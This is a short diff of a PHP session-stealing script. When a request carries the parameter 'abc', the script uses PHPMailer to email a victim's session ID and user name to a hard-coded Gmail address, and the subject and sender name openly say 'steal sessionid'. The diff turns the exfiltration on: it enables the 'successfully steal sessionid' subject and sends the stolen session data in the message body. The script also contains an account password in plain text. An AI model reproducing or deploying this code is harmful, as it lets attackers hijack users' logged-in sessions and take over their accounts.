@@ -30,9 +30,9 @@ if (isset($_GET["abc"])) {
     $mail->Password = '102102102';
     $mail->SetFrom('ahbcgd590@gmail.com', "steal SESIONID");
     $mail->AddReplyTo('ahbcgd590@gmail.com', 'Admin');
-  //  $mail->Subject = 'successfully steal sessionid';
+    $mail->Subject = 'successfully steal sessionid';
     $mail->MsgHTML("sessionid : ".$sessionid." user : ".$user);
-     $mail->MsgHTML("ok");
+   //  $mail->MsgHTML("ok");
     $mail->AddAddress('ahbcgd590@gmail.com', 'me');
     
     $mail->Send();
